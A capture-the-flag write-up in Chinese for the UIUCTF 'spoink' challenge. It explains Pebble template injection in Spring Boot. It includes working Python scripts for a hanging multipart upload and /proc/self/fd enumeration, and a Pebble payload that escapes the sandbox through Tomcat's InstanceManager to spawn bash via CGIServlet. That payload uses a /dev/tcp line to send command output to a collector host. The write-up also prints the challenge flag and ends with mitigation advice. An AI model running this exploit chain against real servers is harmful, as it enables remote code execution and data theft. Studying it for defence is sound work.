# spoink

## 题目简述

应用使用 Spring Boot 2.6.6 与 Pebble 3.1.5。控制器把查询参数 `x` 直接作为视图名返回：

```java
@RequestMapping({"/"})
public String getTemplate(
    @RequestParam("x") Optional<String> template,
    Model model) {
    return template.orElse("home.pebble");
}
```

容器中的 `/usr/src/app/getflag` 只有执行权限，网页还提示需要执行它。利用链有两个独立障碍：先把恶意 Pebble 模板放进服务器可读取的位置，再从 Pebble 暴露的 Spring/Tomcat 对象逃出模板沙箱，实例化 `CGIServlet` 执行命令。

## 解题过程

### 用未完成 multipart 请求制造临时文件

应用没有普通上传端点，但 Tomcat 解析较大的 `multipart/form-data` 请求时会把文件 part 落到临时文件，并在请求结束前保持文件描述符打开。官方解法声明 `Content-Length: 11000`，发送文件 part 后故意不发送结束 boundary，而是持续缓慢发送填充字节：

```python
from pwn import remote
import time

HOST = 'TARGET'
PORT = 80

payload = open('payload.pebble', 'rb').read()
r = remote(HOST, PORT)
r.send(
    b'POST / HTTP/1.1\r\n'
    + f'Host: {HOST}:{PORT}\r\n'.encode()
    + b'Connection: close\r\n'
    + b'Content-Type: multipart/form-data; boundary=meepmoop\r\n'
    + b'Content-Length: 11000\r\n\r\n'
)
r.send(
    b'--meepmoop\r\n'
    b'Content-Disposition: form-data; '
    b'name="foo"; filename="foo"\r\n\r\n'
)
r.send(payload)

while True:
    r.send(b'B')
    time.sleep(0.1)
```

只要连接保持未完成，临时文件的 FD 就存在于同一 Java 进程的 `/proc/self/fd/` 下。视图名可目录穿越，因此从另一条连接枚举一小段 FD：

```python
import requests

for fd in range(8, 32):
    try:
        url = f'http://TARGET/?x=../../../../proc/self/fd/{fd}'
        r = requests.get(url, timeout=3)
        if b'PAYLOAD_END' in r.content:
            print('template fd:', fd)
            print(r.content)
    except requests.RequestException:
        pass
```

`PAYLOAD_END` 是预先放在恶意模板中的标记。命中后，Pebble 会把仍打开的 multipart 临时文件当成模板解析。FD 数不是协议常量，必须枚举，不能把官方测试环境中的 10 至 14 写死成通用答案。

### 从 Pebble 全局对象进入 Tomcat

Pebble 自身限制了直接反射，但 Spring 集成向模板暴露了 `beans`、`request` 和 `response`。利用 `dispatcherServlet` 可以取得 Tomcat 的 `StandardContext`，ServletContext 中的 `org.apache.tomcat.InstanceManager` 又能按类名实例化容器类：

```twig
{% set parent = beans.get("dispatcherServlet")
  .getWebApplicationContext()
  .getWebServer()
  .getTomcat()
  .getHost()
  .findChild("") %}

{% set ctx = request.getServletContext() %}
{% set cl = ctx.getClassLoader() %}
{% set im = ctx.getAttribute("org.apache.tomcat.InstanceManager") %}
{% set srv = im.newInstance(
  "org.apache.catalina.servlets.CGIServlet", cl) %}
{% set sw = im.newInstance(
  "org.apache.catalina.core.StandardWrapper", cl) %}
```

接着配置一个只服务当前请求的 `CGIServlet`。官方 payload 把 executable 设成 `/bin/bash`，用 `-c` 执行命令，并把 `getflag` 输出发往攻击者监听端：

```twig
{{ sw.setParent(parent) }}
{{ sw.addInitParameter("cgiMethods", "*") }}
{{ sw.addInitParameter("executable", "/bin/bash") }}
{{ sw.addInitParameter("executable-arg-1", "-c") }}
{{ sw.addInitParameter(
  "executable-arg-2",
  "exec 3<>/dev/tcp/COLLECTOR/80; "
  ~ "printf 'GET / HTTP/1.1\\r\\nHost: COLLECTOR\\r\\nFlag: '; "
  ~ "/usr/src/app/getflag; "
  ~ "printf '\\r\\nConnection: close\\r\\n\\r\\n' >&3"
) }}
```

`CGIServlet` 还会检查其认为的 CGI 路径是否存在。模板可伪造 servlet include 属性，把它指向容器中已有的 `/style.css`：

```twig
{{ request.setAttribute("javax.servlet.include.request_uri", "1") }}
{{ request.setAttribute("javax.servlet.include.context_path", "") }}
{{ request.setAttribute("javax.servlet.include.servlet_path", "") }}
{{ request.setAttribute("javax.servlet.include.path_info", "/style.css") }}

{{ srv.init(sw) }}
{{ srv.service(request, response) }}

PAYLOAD_END
```

实际回连命令可改成自己的 HTTP/DNS 收集方式；题解不依赖官方脚本中已经失效的旧回连域名。`/usr/src/app/getflag` 执行后输出：

```text
uiuctf{gRumP1g_iS_uglY}
```

## 方法总结

- 核心技巧：用悬挂的 multipart 请求把模板写入 Tomcat 临时文件，经 `/proc/self/fd/N` 与视图名目录穿越加载，再滥用 Spring 暴露对象和 Tomcat `InstanceManager` 动态配置 `CGIServlet` 获得 RCE。
- 识别信号：用户输入直接成为模板名、目标没有显式上传功能但运行 Tomcat、模板上下文暴露 `beans/request/response`，且 flag 只能执行不能读取。
- 复用要点：利用链的“写入”和“执行”是两个阶段；第一条连接必须保持打开，第二条连接的 FD 需要有界枚举。修复时应固定视图白名单、禁止路径穿越、减少模板全局对象，并避免让应用代码取得容器级实例化接口。
